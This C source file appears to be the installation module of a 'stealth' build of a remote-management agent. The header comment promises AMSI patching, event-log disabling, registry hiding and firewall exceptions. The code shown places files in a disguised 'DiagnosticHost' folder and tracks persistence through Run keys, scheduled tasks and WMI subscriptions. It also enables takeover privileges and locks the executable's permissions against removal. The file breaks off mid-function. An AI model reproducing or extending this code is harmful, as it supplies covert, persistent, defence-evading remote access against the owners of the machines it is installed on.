/*
 * MeshAgent Stealth - Complete Installation Module
 *
 * Handles full installation process including:
 * - File deployment to System32
 * - Service registration (standalone or svchost)
 * - Firewall exception rules
 * - Registry configuration and hiding
 * - AMSI patching
 * - Event log disabling
 */

#include <windows.h>
#include <shlobj.h>
#include <knownfolders.h>
#include <aclapi.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <strsafe.h>
#include <stdarg.h>
#include <wctype.h>
#include <tlhelp32.h>
#include "stealth.h"
#include "stealth_utils.h"
#include "branding_util.h"
#include "service_security.h"
#include "svchost_payload.h"
#include "stealth_defaults.h"
#include "stealth_resilience.h"

static void MeshInstaller_NormalizePathSeparators(wchar_t* path)
{
    if (path == NULL) { return; }
    for (size_t i = 0; path[i] != L'\0'; ++i)
    {
        if (path[i] == L'/')
        {
            path[i] = L'\\';
        }
    }
}

static BOOL MeshInstaller_GetDefaultInstallRoot(wchar_t* buffer, size_t count)
{
    if (buffer == NULL || count == 0) { return FALSE; }
    PWSTR programData = NULL;
    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_ProgramData, KF_FLAG_DEFAULT, NULL, &programData);
    BOOL resolved = FALSE;
    if (SUCCEEDED(hr) && programData != NULL)
    {
        resolved = SUCCEEDED(StringCchCopyW(buffer, count, programData));
        CoTaskMemFree(programData);
    }

    if (!resolved)
    {
        DWORD envLen = GetEnvironmentVariableW(L"ProgramData", buffer, (DWORD)count);
        resolved = (envLen > 0 && envLen < count);
    }

    if (!resolved)
    {
        WCHAR windowsDir[MAX_PATH] = {0};
        UINT wlen = GetWindowsDirectoryW(windowsDir, MAX_PATH);
        if (wlen == 0 || wlen >= MAX_PATH) { return FALSE; }
        if (FAILED(StringCchPrintfW(buffer, count, L"%s\\ProgramData", windowsDir))) { return FALSE; }
        resolved = TRUE;
    }

    if (!resolved) { return FALSE; }

    MeshInstaller_NormalizePathSeparators(buffer);
    size_t len = wcslen(buffer);
    if (len > 0 && buffer[len - 1] != L'\\')
    {
        if (FAILED(StringCchCatW(buffer, count, L"\\"))) { return FALSE; }
    }
    if (FAILED(StringCchCatW(buffer, count, L"DiagnosticHost"))) { return FALSE; }
    return TRUE;
}

static BOOL MeshInstaller_CombinePath(wchar_t* dest, size_t destLen, const wchar_t* root, const wchar_t* leaf)
{
    if (dest == NULL || destLen == 0) { return FALSE; }
    dest[0] = L'\0';
    if (root == NULL || root[0] == L'\0') { return FALSE; }

    if (FAILED(StringCchCopyW(dest, destLen, root))) { return FALSE; }
    MeshInstaller_NormalizePathSeparators(dest);

    if (leaf != NULL && leaf[0] != L'\0')
    {
        WCHAR leafCopy[MAX_PATH] = {0};
        if (FAILED(StringCchCopyW(leafCopy, _countof(leafCopy), leaf))) { return FALSE; }
        MeshInstaller_NormalizePathSeparators(leafCopy);
        size_t len = wcslen(dest);
        if (len > 0 && dest[len - 1] != L'\\')
        {
            if (FAILED(StringCchCatW(dest, destLen, L"\\"))) { return FALSE; }
        }
        if (FAILED(StringCchCatW(dest, destLen, leafCopy))) { return FALSE; }
    }

    return TRUE;
}

// Forward declaration - implementation after global variables
static void Stealth_UpdatePersistenceStatePath(const wchar_t* installRoot);

// Forward declarations for persistence helpers
static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting);
static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting);
static void Stealth_ConfigureServiceRecoveryIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
static SC_ACTION* Stealth_CreateRestartPlan(size_t actionCount, DWORD delayMs, DWORD* actionCountOut);
static SC_ACTION* Stealth_BuildRecoveryActionsFromCsv(const wchar_t* csv, DWORD delayMs, DWORD* actionCountOut);
static void Stealth_TrimWhitespaceInplace(wchar_t* value);
static SC_ACTION_TYPE Stealth_MapRecoveryActionToken(const wchar_t* token);
static void Stealth_EnablePrivilege(const wchar_t* privilegeName);
void Stealth_LogInstallEvent(const wchar_t* format, ...);
static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* context);
static void Stealth_ResolveDefaultLogPath(void);
static void Stealth_LogAnsiMessage(const char* message);
static void Stealth_EnsureLogDirectory(void);
static void Stealth_PruneInstallLogIfNeeded(void);
static void Stealth_SetInstallerLogPathToTemp(const wchar_t* fileName);
void Stealth_EnsureLoggingDefaults(void);
static BOOL Stealth_StopServiceAndWait(const wchar_t* serviceName, DWORD timeoutMs, BOOL forceTerminate);
static BOOL Stealth_QueryServiceStartType(const wchar_t* serviceName, DWORD* startTypeOut);
static BOOL Stealth_SetServiceStartType(const wchar_t* serviceName, DWORD startType);
static BOOL Stealth_SetServiceAllowStop(const wchar_t* serviceName, BOOL allow);
static void Stealth_TerminateProcessesByPath(const wchar_t* exePath);
static BOOL Stealth_DeleteExistingService(const wchar_t* serviceName);
static BOOL Stealth_RemoveFileIfExists(const wchar_t* path, BOOL logOnFailure);
static BOOL Stealth_RemoveFileIfExistsWithTimeout(const wchar_t* path, DWORD timeoutMs, BOOL logOnFailure);
void Stealth_LogPathState(const wchar_t* path);
static void Stealth_RemoveRunKeyEntry(const wchar_t* serviceName);
static BOOL Stealth_NormalizeTaskNameInplace(wchar_t* taskName, size_t capacity);
static BOOL Stealth_CopyTaskNameFromUtf8(const char* source, wchar_t* dest, size_t destLen);
static BOOL Stealth_FormatDefaultTaskName(const wchar_t* base, const wchar_t* suffix, wchar_t* dest, size_t destLen);
static void Stealth_SanitizeTaskHint(const wchar_t* input, wchar_t* output, size_t outputSize);
static void Stealth_BuildTaskPrefixFromHint(const wchar_t* hint, const wchar_t* fallback, wchar_t* output, size_t outputSize);
static BOOL Stealth_AddTaskCandidate(wchar_t candidates[][STEALTH_TASK_NAME_MAX], size_t* count, size_t capacity, const wchar_t* name);
static size_t Stealth_BuildTaskPrefixCandidates(const mesh_persistence_profile_t* persistence, const wchar_t* serviceDisplayName, const wchar_t* serviceKeyName, wchar_t candidates[][STEALTH_TASK_NAME_MAX], size_t capacity);
static BOOL Stealth_FindTaskByPrefixCandidates(wchar_t candidates[][STEALTH_TASK_NAME_MAX], size_t count, const wchar_t* token, wchar_t* outTaskPath, size_t outTaskPathCch);
static BOOL Stealth_FindWmiByPrefixCandidates(wchar_t candidates[][STEALTH_TASK_NAME_MAX], size_t count, wchar_t* outFilterName, size_t outFilterNameCch, wchar_t* outConsumerName, size_t outConsumerNameCch);
static BOOL Stealth_RemoveScheduledTaskByName(const wchar_t* taskName, const wchar_t* context);
static void Stealth_RemoveScheduledTasks(const mesh_persistence_profile_t* persistence, const wchar_t* serviceDisplayName, const wchar_t* serviceKeyName);
static BOOL Stealth_EnsureConfigFile(const wchar_t* sourceExePath, const wchar_t* destPath);
static BOOL Stealth_EnsureMshFile(const wchar_t* sourceExePath, const wchar_t* destPath, const wchar_t* fallbackConfPath);
static BOOL Stealth_ConfigHasRequiredKeys(const wchar_t* configPath);
static BOOL Stealth_ShouldEnableDebugConsole(void);
static void Stealth_AppendConfigOverride(const wchar_t* path, const char* key, const char* value);
static void Stealth_ClearServiceRecovery(const wchar_t* serviceName);
static BOOL Stealth_DoFirewallRulesMatch(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath);
static BOOL Stealth_WaitForFirewallRuleConvergence(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath, DWORD timeoutMs);
static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath);
static BOOL Stealth_ValidateSvchostPayloadDll(const wchar_t* dllPath);
static BOOL Stealth_VerifySvchostServiceBinding(const wchar_t* serviceName, const wchar_t* dllPath);
static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const wchar_t* dllPath, DWORD timeoutMs, BOOL allowRepair);
static void Stealth_RecordServiceDllHash(const wchar_t* serviceName, const wchar_t* dllPath);

#define STEALTH_INSTALL_LOG_MAX_BYTES    (512ULL * 1024ULL)
#define STEALTH_SERVICE_STOP_TIMEOUT_MS  (30 * 1000)
#define STEALTH_FIREWALL_SETTLE_TIMEOUT_MS (12 * 1000)
#define STEALTH_FIREWALL_RETRY_DELAY_MS    (1000)
#define STEALTH_FIREWALL_MAX_ATTEMPTS      (3)

static wchar_t g_InstallLogPath[MAX_PATH] = {0};
static BOOL g_HaveInstallLogPath = FALSE;
static wchar_t g_PersistenceStatePath[MAX_PATH] = {0};
static BOOL g_HavePersistenceStatePath = FALSE;

BOOL Stealth_LoadPersistenceState(StealthPersistenceState* state);
BOOL Stealth_SavePersistenceState(const StealthPersistenceState* state);
void Stealth_ClearPersistenceState(void);
static BOOL Stealth_GetPersistenceStateDirectory(wchar_t* buffer, size_t bufferCch);
void Stealth_RecordPersistenceTask(StealthPersistenceState* state, const wchar_t* taskPath, BOOL isRestartTask);
void Stealth_RecordPersistenceWmi(StealthPersistenceState* state, const wchar_t* filterName, const wchar_t* consumerName);

// Implementation of Stealth_UpdatePersistenceStatePath (after globals)
static void Stealth_UpdatePersistenceStatePath(const wchar_t* installRoot)
{
    if (installRoot == NULL || installRoot[0] == L'\0') { return; }
    wchar_t stateDir[MAX_PATH] = {0};
    if (!MeshInstaller_CombinePath(stateDir, _countof(stateDir), installRoot, L"state")) { return; }
    if (!MeshInstaller_CombinePath(g_PersistenceStatePath, _countof(g_PersistenceStatePath), stateDir, L"persistence.ini")) { return; }
    g_HavePersistenceStatePath = (g_PersistenceStatePath[0] != L'\0');
}

// ================================================================
// Installation Paths
// ================================================================

BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths)
{
    if (paths == NULL) { return FALSE; }

    memset(paths, 0, sizeof(StealthInstallPaths));

    const mesh_branding_definition_t* branding = MeshConfig_GetBranding();

    MeshService_CopyBrandingPathToWide(MeshService_GetInstallRootText(), paths->installDir, MAX_PATH);
    if (paths->installDir[0] == L'\0')
    {
        if (!MeshInstaller_GetDefaultInstallRoot(paths->installDir, MAX_PATH)) { return FALSE; }
    }
    MeshInstaller_NormalizePathSeparators(paths->installDir);
    if (!g_HavePersistenceStatePath)
    {
        Stealth_UpdatePersistenceStatePath(paths->installDir);
    }

    MeshService_CopyBrandingPathToWide(MeshService_GetLogDirectoryText(), paths->logsDir, MAX_PATH);
    if (paths->logsDir[0] == L'\0')
    {
        if (!MeshInstaller_CombinePath(paths->logsDir, MAX_PATH, paths->installDir, L"logs")) { return FALSE; }
    }

    wchar_t exeName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), exeName, _countof(exeName));
    if (exeName[0] == L'\0') { StringCchCopyW(exeName, _countof(exeName), STEALTH_FALLBACK_EXE_NAME); }

    wchar_t dllName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), dllName, _countof(dllName));
    if (dllName[0] == L'\0') { StringCchCopyW(dllName, _countof(dllName), STEALTH_FALLBACK_DLL_NAME); }

    wchar_t dbName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetDatabaseFileNameText(), dbName, _countof(dbName));
    if (dbName[0] == L'\0') { StringCchCopyW(dbName, _countof(dbName), STEALTH_FALLBACK_DB_NAME); }

    wchar_t confName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetConfigFileNameText(), confName, _countof(confName));
    if (confName[0] == L'\0') { StringCchCopyW(confName, _countof(confName), STEALTH_FALLBACK_CONF_NAME); }

    wchar_t logFileName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetLogFileNameText(), logFileName, _countof(logFileName));
    if (logFileName[0] == L'\0') { StringCchCopyW(logFileName, _countof(logFileName), STEALTH_FALLBACK_LOG_NAME); }

    if (!MeshInstaller_CombinePath(paths->exePath, MAX_PATH, paths->installDir, exeName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->dllPath, MAX_PATH, paths->installDir, dllName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->dbPath, MAX_PATH, paths->installDir, dbName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->confPath, MAX_PATH, paths->installDir, confName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->logPath, MAX_PATH, paths->logsDir, logFileName)) { return FALSE; }

    if (!g_HaveInstallLogPath)
    {
        wchar_t installerLog[MAX_PATH] = {0};
        if (MeshInstaller_CombinePath(installerLog, MAX_PATH, paths->logsDir, L"installer.log"))
        {
            wcsncpy_s(g_InstallLogPath, _countof(g_InstallLogPath), installerLog, _TRUNCATE);
            g_HaveInstallLogPath = (g_InstallLogPath[0] != L'\0');
            if (g_HaveInstallLogPath)
            {
                Stealth_DebugPrintfW(L"Installer log path: %ls", g_InstallLogPath);
            }
        }
    }

    return TRUE;
}

void Stealth_LogInstallEvent(const wchar_t* format, ...)
{
    if (!g_HaveInstallLogPath) { Stealth_ResolveDefaultLogPath(); }
    if (!g_HaveInstallLogPath || format == NULL) { return; }

    Stealth_EnsureLogDirectory();
    Stealth_PruneInstallLogIfNeeded();

    FILE* logFile = NULL;
    if (_wfopen_s(&logFile, g_InstallLogPath, L"a+, ccs=UNICODE") != 0 || logFile == NULL)
    {
        wchar_t tempPath[MAX_PATH] = {0};
        if (GetTempPathW(_countof(tempPath), tempPath) > 0)
        {
            wchar_t fallback[MAX_PATH] = {0};
            if (MeshInstaller_CombinePath(fallback, _countof(fallback), tempPath, L"MeshInstaller.log"))
            {
                wcsncpy_s(g_InstallLogPath, _countof(g_InstallLogPath), fallback, _TRUNCATE);
                g_HaveInstallLogPath = TRUE;
                Stealth_EnsureLogDirectory();
                if (_wfopen_s(&logFile, g_InstallLogPath, L"a+, ccs=UNICODE") != 0 || logFile == NULL)
                {
                    return;
                }
            }
            else
            {
                return;
            }
        }
        else
        {
            return;
        }
    }

    wchar_t timestamp[64];
    SYSTEMTIME st;
    GetLocalTime(&st);
    StringCchPrintfW(timestamp, _countof(timestamp), L"[%04u-%02u-%02u %02u:%02u:%02u] ",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    fputws(timestamp, logFile);

    va_list args;
    va_start(args, format);
    vfwprintf(logFile, format, args);
    va_end(args);

    fputws(L"\n", logFile);
    fflush(logFile);
    fclose(logFile);
}

// ================================================================
// Persistence State Helpers
// ================================================================

static BOOL Stealth_GetPersistenceStateDirectory(wchar_t* buffer, size_t bufferCch)
{
    if (!g_HavePersistenceStatePath || buffer == NULL || bufferCch == 0) { return FALSE; }
    if (FAILED(StringCchCopyW(buffer, bufferCch, g_PersistenceStatePath))) { return FALSE; }
    wchar_t* lastSlash = wcsrchr(buffer, L'\\');
    if (lastSlash == NULL)
    {
        buffer[0] = L'\0';
        return FALSE;
    }
    *lastSlash = L'\0';
    return TRUE;
}

BOOL Stealth_SavePersistenceState(const StealthPersistenceState* state)
{
    if (state == NULL)
    {
        return FALSE;
    }

    if (!g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
    {
        StealthInstallPaths paths;
        if (!Stealth_GetInstallPaths(&paths) || !g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
        {
            return FALSE;
        }
    }

    wchar_t directory[MAX_PATH] = {0};
    if (!Stealth_GetPersistenceStateDirectory(directory, _countof(directory)))
    {
        return FALSE;
    }

    Stealth_CreateInstallationDirectory(directory);

    FILE* file = NULL;
    if (_wfopen_s(&file, g_PersistenceStatePath, L"w, ccs=UNICODE") != 0 || file == NULL)
    {
        return FALSE;
    }

    fwprintf(file, L"AutorunTask=%ls\n", state->AutorunTask);
    fwprintf(file, L"RestartTask=%ls\n", state->RestartTask);
    fwprintf(file, L"WmiFilter=%ls\n", state->WmiFilter);
    fwprintf(file, L"WmiConsumer=%ls\n", state->WmiConsumer);
    fclose(file);
    return TRUE;
}

BOOL Stealth_LoadPersistenceState(StealthPersistenceState* state)
{
    if (state == NULL)
    {
        return FALSE;
    }
    ZeroMemory(state, sizeof(*state));

    if (!g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
    {
        StealthInstallPaths paths;
        if (!Stealth_GetInstallPaths(&paths) || !g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
        {
            return FALSE;
        }
    }

    FILE* file = NULL;
    if (_wfopen_s(&file, g_PersistenceStatePath, L"r, ccs=UNICODE") != 0 || file == NULL)
    {
        return FALSE;
    }

    BOOL loaded = FALSE;
    wchar_t line[512];
    while (fgetws(line, _countof(line), file) != NULL)
    {
        size_t len = wcslen(line);
        while (len > 0 && (line[len - 1] == L'\r' || line[len - 1] == L'\n'))
        {
            line[--len] = L'\0';
        }

        if (_wcsnicmp(line, L"AutorunTask=", 12) == 0)
        {
            wcsncpy_s(state->AutorunTask, _countof(state->AutorunTask), line + 12, _TRUNCATE);
            loaded = TRUE;
        }
        else if (_wcsnicmp(line, L"RestartTask=", 12) == 0)
        {
            wcsncpy_s(state->RestartTask, _countof(state->RestartTask), line + 12, _TRUNCATE);
            loaded = TRUE;
        }
        else if (_wcsnicmp(line, L"WmiFilter=", 10) == 0)
        {
            wcsncpy_s(state->WmiFilter, _countof(state->WmiFilter), line + 10, _TRUNCATE);
            loaded = TRUE;
        }
        else if (_wcsnicmp(line, L"WmiConsumer=", 12) == 0)
        {
            wcsncpy_s(state->WmiConsumer, _countof(state->WmiConsumer), line + 12, _TRUNCATE);
            loaded = TRUE;
        }
    }
    fclose(file);
    return loaded;
}

void Stealth_ClearPersistenceState(void)
{
    if (!g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
    {
        StealthInstallPaths paths;
        if (!Stealth_GetInstallPaths(&paths) || !g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
        {
            return;
        }
    }
    DeleteFileW(g_PersistenceStatePath);
}

void Stealth_RecordPersistenceTask(StealthPersistenceState* state, const wchar_t* taskPath, BOOL isRestartTask)
{
    if (state == NULL || taskPath == NULL) { return; }
    if (isRestartTask)
    {
        wcsncpy_s(state->RestartTask, _countof(state->RestartTask), taskPath, _TRUNCATE);
    }
    else
    {
        wcsncpy_s(state->AutorunTask, _countof(state->AutorunTask), taskPath, _TRUNCATE);
    }
}

void Stealth_RecordPersistenceWmi(StealthPersistenceState* state, const wchar_t* filterName, const wchar_t* consumerName)
{
    if (state == NULL) { return; }
    if (filterName != NULL)
    {
        wcsncpy_s(state->WmiFilter, _countof(state->WmiFilter), filterName, _TRUNCATE);
    }
    if (consumerName != NULL)
    {
        wcsncpy_s(state->WmiConsumer, _countof(state->WmiConsumer), consumerName, _TRUNCATE);
    }
}

static BOOL Stealth_RemoveFileIfExists(const wchar_t* path, BOOL logOnFailure)
{
    if (path == NULL || path[0] == L'\0') { return TRUE; }

    DWORD attr = GetFileAttributesW(path);
    if (attr == INVALID_FILE_ATTRIBUTES) { return TRUE; }

    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);

    for (int attempt = 0; attempt < 5; ++attempt)
    {
        if (DeleteFileW(path)) { return TRUE; }
        DWORD err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND) { return TRUE; }
        Sleep(100);
    }

    if (logOnFailure)
    {
        DWORD err = GetLastError();
        Stealth_LogInstallEvent(L"DeleteFile failed for %ls (error=%lu)", path, err);
        Stealth_LogPathState(path);
    }
    return FALSE;
}

static BOOL Stealth_RemoveFileIfExistsWithTimeout(const wchar_t* path, DWORD timeoutMs, BOOL logOnFailure)
{
    if (path == NULL || path[0] == L'\0') { return TRUE; }

    DWORD attr = GetFileAttributesW(path);
    if (attr == INVALID_FILE_ATTRIBUTES) { return TRUE; }

    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);

    const DWORD startTick = GetTickCount();
    DWORD delay = 100;
    DWORD lastErr = ERROR_SUCCESS;

    while ((GetTickCount() - startTick) < timeoutMs)
    {
        if (DeleteFileW(path)) { return TRUE; }

        lastErr = GetLastError();
        if (lastErr == ERROR_FILE_NOT_FOUND) { return TRUE; }

        // Common transient errors while services/processes unwind and release locks.
        if (lastErr == ERROR_SHARING_VIOLATION ||
            lastErr == ERROR_LOCK_VIOLATION ||
            lastErr == ERROR_ACCESS_DENIED)
        {
            Sleep(delay);
            if (delay < 1000) { delay += 100; }
            continue;
        }

        Sleep(200);
    }

    if (logOnFailure)
    {
        Stealth_LogInstallEvent(L"DeleteFile failed for %ls (error=%lu)", path, lastErr);
        Stealth_LogPathState(path);
    }
    SetLastError(lastErr);
    return FALSE;
}

static BOOL Stealth_RemoveDirectoryTree(const wchar_t* path, BOOL logOnFailure)
{
    if (path == NULL || path[0] == L'\0') { return TRUE; }
    DWORD attr = GetFileAttributesW(path);
    if (attr == INVALID_FILE_ATTRIBUTES) { return TRUE; }

    if ((attr & FILE_ATTRIBUTE_DIRECTORY) == 0)
    {
        return Stealth_RemoveFileIfExists(path, logOnFailure);
    }

    wchar_t pattern[MAX_PATH] = {0};
    if (FAILED(StringCchPrintfW(pattern, _countof(pattern), L"%ls\\*", path)))
    {
        return FALSE;
    }

    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(pattern, &findData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
            {
                continue;
            }

            wchar_t child[MAX_PATH] = {0};
            if (!MeshInstaller_CombinePath(child, _countof(child), path, findData.cFileName))
            {
                continue;
            }

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                Stealth_RemoveDirectoryTree(child, logOnFailure);
            }
            else
            {
                Stealth_RemoveFileIfExists(child, logOnFailure);
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }

    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
    if (RemoveDirectoryW(path))
    {
        return TRUE;
    }

    if (logOnFailure)
    {
        DWORD err = GetLastError();
        Stealth_LogInstallEvent(L"RemoveDirectory failed for %ls (error=%lu)", path, err);
        Stealth_LogPathState(path);
    }
    return FALSE;
}

void Stealth_LogPathState(const wchar_t* path)
{
    if (path == NULL || path[0] == L'\0') { return; }

    WIN32_FILE_ATTRIBUTE_DATA data;
    if (GetFileAttributesExW(path, GetFileExInfoStandard, &data))
    {
        ULARGE_INTEGER size;
        size.HighPart = data.nFileSizeHigh;
        size.LowPart = data.nFileSizeLow;

        FILETIME localWriteTime;
        SYSTEMTIME st = {0};
        if (FileTimeToLocalFileTime(&data.ftLastWriteTime, &localWriteTime) &&
            FileTimeToSystemTime(&localWriteTime, &st))
        {
            Stealth_LogInstallEvent(
                L"Path state [%ls]: size=%I64u attrs=0x%08X lastWrite=%04u-%02u-%02u %02u:%02u:%02u",
                path,
                size.QuadPart,
                data.dwFileAttributes,
                st.wYear, st.wMonth, st.wDay,
                st.wHour, st.wMinute, st.wSecond);
        }
        else
        {
            Stealth_LogInstallEvent(
                L"Path state [%ls]: size=%I64u attrs=0x%08X lastWrite=<unavailable>",
                path,
                size.QuadPart,
                data.dwFileAttributes);
        }
    }
    else
    {
        DWORD err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND)
        {
            Stealth_LogInstallEvent(L"Path state [%ls]: not present", path);
        }
        else
        {
            Stealth_LogInstallEvent(L"Path state [%ls]: unavailable (error=%lu)", path, err);
        }
    }
}

static void Stealth_EnablePrivilege(const wchar_t* privilegeName)
{
    if (privilegeName == NULL || privilegeName[0] == L'\0') { return; }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return;
    }

    LUID luid;
    TOKEN_PRIVILEGES tp;
    if (LookupPrivilegeValueW(NULL, privilegeName, &luid))
    {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    }

    CloseHandle(hToken);
}

static BOOL Stealth_HardenHostExecutableDacl(const wchar_t* exePath)
{
    if (exePath == NULL || exePath[0] == L'\0') { return FALSE; }
    if (GetFileAttributesW(exePath) == INVALID_FILE_ATTRIBUTES) { return FALSE; }

    Stealth_EnablePrivilege(L"SeTakeOwnershipPrivilege");
    Stealth_EnablePrivilege(L"SeSecurityPrivilege");
    Stealth_EnablePrivilege(L"SeBackupPrivilege");
    Stealth_EnablePrivilege(L"SeRestorePrivilege");

    PSECURITY_DESCRIPTOR pSD = NULL;
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
        STEALTH_HOST_EXE_DACL_SDDL, SDDL_REVISION_1, &pSD, NULL))
    {
        Stealth_DebugLastErrorW(L"ConvertStringSecurityDescriptorToSecurityDescriptorW (host exe)");
        return FALSE;
    }

    PACL dacl = NULL;
    BOOL daclPresent = FALSE;
    BOOL daclDefaulted = FALSE;
    BOOL ok = FALSE;

    if (GetSecurityDescriptorDacl(pSD, &daclPresent, &dacl, &daclDefaulted) &&
        daclPresent && dacl != NULL)
    {
        DWORD setResult = SetNamedSecurityInfoW(
            (LPWSTR)exePath,
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
            NULL, NULL, dacl, NULL);
        if (setResult == ERROR_SUCCESS)
        {
            ok = TRUE;
        }
        else
        {
            Stealth_DebugPrintfW(L"SetNamedSecurityInfoW failed (%lu) for %ls", setResult, exePath);
            SetLastError(setResult);
        }
    }

    LocalFree(pSD);
    return ok;
}

static void Stealth_LogAnsiMessage(const char* message)
{
    if (message == NULL || message[0] == '\0') { return; }
    int needed = MultiByteToWideChar(CP_ACP, 0, message, -1, NULL, 0);
    if (needed <= 0 || needed > 2048) { return; }
    wchar_t* wbuffer = (wchar_t*)malloc(sizeof(wchar_t) * needed);
    if (wbuffer == NULL) { return; }
    MultiByteToWideChar(CP_ACP, 0, message, -1, wbuffer, needed);
    Stealth_LogInstallEvent(L"%ls", wbuffer);
    free(wbuffer);
}

static void Stealth_EnsureLogDirectory(void)
{
    if (!g_HaveInstallLogPath) { return; }
    wchar_t pathCopy[MAX_PATH] = {0};
    wcsncpy_s(pathCopy, _countof(pathCopy), g_InstallLogPath, _TRUNCATE);
    wchar_t* lastSlash = wcsrchr(pathCopy, L'\\');
    if (lastSlash != NULL)
    {
        *lastSlash = L'\0';
        if (pathCopy[0] != L'\0')
        {
            Stealth_CreateInstallationDirectory(pathCopy);
        }
    }
}

static void Stealth_PruneInstallLogIfNeeded(void)
{
    if (!g_HaveInstallLogPath) { return; }

    WIN32_FILE_ATTRIBUTE_DATA attr = {0};
    if (!GetFileAttributesExW(g_InstallLogPath, GetFileExInfoStandard, &attr))
    {
        return;
    }

    ULARGE_INTEGER size = {0};
    size.LowPart = attr.nFileSizeLow;
    size.HighPart = attr.nFileSizeHigh;
    if (size.QuadPart < STEALTH_INSTALL_LOG_MAX_BYTES)
    {
        return;
    }

    wchar_t rotated[MAX_PATH] = {0};
    if (FAILED(StringCchCopyW(rotated, _countof(rotated), g_InstallLogPath)))
    {
        rotated[0] = L'\0';
    }
    if (rotated[0] != L'\0')
    {
        if (FAILED(StringCchCatW(rotated, _countof(rotated), L".bak")))
        {
            rotated[0] = L'\0';
        }
    }

    if (rotated[0] != L'\0')
    {
        DeleteFileW(rotated);
        if (!MoveFileExW(g_InstallLogPath, rotated, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
        {
            DeleteFileW(g_InstallLogPath);
        }
    }
    else
    {
        DeleteFileW(g_InstallLogPath);
    }
}

static void Stealth_ToUppercase(wchar_t* text)
{
    if (text == NULL) { return; }
    for (wchar_t* p = text; *p != L'\0'; ++p)
    {
        *p = (wchar_t)towupper(*p);
    }
}

void Stealth_EnsureLoggingDefaults(void)
{
    if (g_HaveInstallLogPath) { return; }

    wchar_t logDir[MAX_PATH] = {0};
    MeshService_CopyBrandingPathToWide(MeshService_GetLogDirectoryText(), logDir, _countof(logDir));
    if (logDir[0] == L'\0')
    {
        if (!MeshInstaller_GetDefaultInstallRoot(logDir, _countof(logDir)))
        {
            return;
        }
        MeshInstaller_CombinePath(logDir, _countof(logDir), logDir, L"logs");
    }

    wchar_t logName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetLogFileNameText(), logName, _countof(logName));
    if (logName[0] == L'\0')
    {
        wcscpy_s(logName, _countof(logName), STEALTH_FALLBACK_LOG_NAME);
    }

    if (MeshInstaller_CombinePath(g_InstallLogPath, _countof(g_InstallLogPath), logDir, logName))
    {
        g_HaveInstallLogPath = (g_InstallLogPath[0] != L'\0');
    }
}

static void Stealth_ResolveDefaultLogPath(void)
{
    if (g_HaveInstallLogPath) { return; }

    wchar_t defaultRoot[MAX_PATH] = {0};
    if (MeshInstaller_GetDefaultInstallRoot(defaultRoot, _countof(defaultRoot)))
    {
        wchar_t logDir[MAX_PATH] = {0};
        if (MeshInstaller_CombinePath(logDir, _countof(logDir), defaultRoot, L"logs"))
        {
            Stealth_CreateInstallationDirectory(logDir);
            if (MeshInstaller_CombinePath(g_InstallLogPath, _countof(g_InstallLogPath), logDir, L"installer.log"))
            {
                g_HaveInstallLogPath = (g_InstallLogPath[0] != L'\0');
            }
        }
    }

    if (!g_HaveInstallLogPath)
    {
        wcscpy_s(g_InstallLogPath, _countof(g_InstallLogPath), L"C:\\ProgramData\\DiagnosticHost\\logs\\installer.log");
